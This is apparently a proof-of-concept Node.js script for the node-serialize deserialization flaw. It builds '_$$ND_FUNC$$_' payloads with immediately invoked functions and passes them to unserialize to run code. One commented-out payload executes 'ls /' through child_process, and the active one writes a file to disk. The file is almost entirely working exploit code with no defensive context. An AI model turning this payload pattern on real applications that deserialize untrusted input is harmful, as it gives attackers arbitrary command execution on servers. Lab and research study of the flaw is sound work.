var serialize = require('node-serialize');
// var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
// var payload = '{"rce":"_$$ND_FUNC$$_function (){console.log}(123)"}';
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'fs\').writeFileSync(\'aaa\', \'aaa /\', function(err, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
